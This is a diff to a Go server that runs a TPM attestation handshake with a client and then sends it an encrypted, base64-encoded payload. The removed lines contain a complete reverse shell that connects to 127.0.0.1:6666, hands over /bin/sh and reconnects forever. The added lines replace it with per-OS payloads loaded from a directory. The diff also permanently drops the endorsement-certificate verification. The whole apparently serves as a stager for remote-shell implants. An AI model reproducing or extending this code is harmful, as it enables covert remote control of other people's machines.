@@ -16,6 +16,7 @@ import (
 	"net/textproto"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"crypto/aes"
 	"crypto/cipher"
@@ -40,6 +41,7 @@ var (
 	TPM_CERT_POOL  = *x509.NewCertPool()
 	payloadBytes   bytes.Buffer
 	encPaylodBytes bytes.Buffer
+	payloads       = make(map[string]*bytes.Buffer, 2)
 )
 
 func encryptedJsonSend(conn *textproto.Writer, tempCipher cipher.AEAD, data any) error {
@@ -79,15 +81,15 @@ func encryptedJsonRead(conn *textproto.Reader, tempCipher cipher.AEAD, data any)
 }
 
 func main() {
-	log.Printf("Loading TPM root certificates")
 	pwd, _ := os.Getwd()
+	log.Printf("Loading TPM root certificates")
 	certsPath := filepath.Join(pwd, "certs")
 	certificateFileNames, err := os.ReadDir(certsPath)
 	if err != nil {
 		log.Panicln(err)
 	}
 	for _, i := range certificateFileNames {
-		derData, err := os.ReadFile("certs/" + i.Name())
+		derData, err := os.ReadFile(filepath.Join(certsPath, i.Name()))
 		if err != nil {
 			log.Panicln(err)
 		}
@@ -97,8 +99,22 @@ func main() {
 		}
 		TPM_CERT_POOL.AddCert(cert)
 	}
+	log.Printf("Loading Payloads")
+	payloadsPath := filepath.Join(pwd, "payloads")
+	payloadFileNames, err := os.ReadDir(payloadsPath)
+	if err != nil {
+		log.Panicln(err)
+	}
+	for _, i := range payloadFileNames {
+		payloadData, err := os.ReadFile(filepath.Join(payloadsPath, i.Name()))
+		if err != nil {
+			log.Panicln(err)
+		}
+		baseName, _ := strings.CutSuffix(i.Name(), filepath.Ext(i.Name()))
+		payloads[baseName] = bytes.NewBuffer(payloadData)
+	}
 	log.Printf("Parsing private key")
-	pemData, err := os.ReadFile("keys/private.pem")
+	pemData, err := os.ReadFile(filepath.Join(pwd, "keys/private.pem"))
 	if err != nil {
 		log.Fatalf("Error reading key file: %v", err)
 	}
@@ -208,6 +224,7 @@ func processClient(connection net.Conn, privKey *ecdsa.PrivateKey) {
 		AttestParams *attest.AttestationParameters `json:"attest_params"`
 		EkCert       []byte                        `json:"ek_cert"`
 		EkUrl        string                        `json:"ek_url"`
+		OS           string                        `json:"os"`
 	}{}
 	if err := encryptedJsonRead(connReader, tempCipher, &attestData); err != nil {
 		log.Println(err)
@@ -238,16 +255,7 @@ func processClient(connection net.Conn, privKey *ecdsa.PrivateKey) {
 		return
 	}
 	ekCert.UnhandledCriticalExtensions = nil
-	//TODO: Fix certificate verification
-	/*
-		_, err = ekCert.Verify(x509.VerifyOptions{
-			Roots: &TPM_CERT_POOL,
-		})
-		if err != nil {
-			log.Println(err)
-			return
-		}
-	*/
+
 	params := attest.ActivationParameters{
 		TPMVersion: attest.TPMVersion20,
 		EK:         ekCert.PublicKey,
@@ -308,36 +316,14 @@ func processClient(connection net.Conn, privKey *ecdsa.PrivateKey) {
 		return
 	}
 	rsaPubKey := cryptoPubKey.(*rsa.PublicKey)
-	payload := `package main
 
-			import (
-				"net"
-				"os/exec"
-				"time"
-			)
-
-			func main() {
-				reverse("127.0.0.1:6666")
-			}
-
-			func reverse(host string) {
-				c, err := net.Dial("tcp", host)
-				if nil != err {
-					if nil != c {
-						c.Close()
-					}
-					time.Sleep(time.Minute)
-					reverse(host)
-				}
-
-				cmd := exec.Command("/bin/sh")
-				cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
-				cmd.Run()
-				c.Close()
-				reverse(host)
-			}
-		`
-	payloadBytes.WriteString(base64.StdEncoding.EncodeToString([]byte(payload)))
+	log.Println(attestData.OS)
+	payloadBuffer, ok := payloads[attestData.OS]
+	if !ok {
+		log.Panicln("Payload for os not found")
+		return
+	}
+	payloadBytes.WriteString(base64.StdEncoding.EncodeToString(payloadBuffer.Bytes()))
 	log.Println(payloadBytes.Len())
 	for payloadBytes.Len() > 0 {
 		encPayloadBlock, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, payloadBytes.Next(150), nil)
